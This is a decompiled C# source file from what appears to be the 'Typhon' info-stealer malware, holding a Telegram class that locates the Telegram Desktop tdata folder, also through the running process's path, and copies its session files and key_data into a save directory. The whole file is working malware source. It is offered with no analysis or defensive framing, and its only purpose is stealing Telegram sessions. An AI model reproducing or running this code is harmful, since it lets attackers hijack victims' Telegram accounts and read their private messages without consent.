using System;
using System.Diagnostics;
using System.IO;
using Typhon.Modules.Miscellaneous;
using Typhon.Stealer.SystemInfo;

namespace Typhon.Stealer.Software.Messaging
{
	// Token: 0x0200001B RID: 27
	internal class Telegram
	{
		// Token: 0x06000072 RID: 114 RVA: 0x00005054 File Offset: 0x00003254
		private static string GetTData()
		{
			string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			if (processesByName.Length == 0)
			{
				return result;
			}
			return Path.Combine(Path.GetDirectoryName(SaveRunningProcess.GetProcessExecutablePath(processesByName[0])), "tdata");
		}

		// Token: 0x06000073 RID: 115 RVA: 0x0000509C File Offset: 0x0000329C
		public static bool StealSession(string sSaveDir)
		{
			string tdata = Telegram.GetTData();
			bool result;
			try
			{
				if (!Directory.Exists(tdata))
				{
					result = false;
				}
				else
				{
					Directory.CreateDirectory(sSaveDir);
					string[] directories = Directory.GetDirectories(tdata);
					string[] files = Directory.GetFiles(tdata);
					foreach (string text in directories)
					{
						string name = new DirectoryInfo(text).Name;
						if (name.Length == 16)
						{
							Path.Combine(sSaveDir, name);
							IOHelper.CopyDirectory(text, sSaveDir);
						}
					}
					string[] array = files;
					for (int i = 0; i < array.Length; i++)
					{
						FileInfo fileInfo = new FileInfo(array[i]);
						string name2 = fileInfo.Name;
						string destFileName = Path.Combine(sSaveDir, name2);
						if (fileInfo.Length <= 5120L)
						{
							if (name2.EndsWith("s") && name2.Length == 17)
							{
								fileInfo.CopyTo(destFileName);
							}
							else if (name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data"))
							{
								fileInfo.CopyTo(destFileName);
							}
						}
					}
					result = true;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
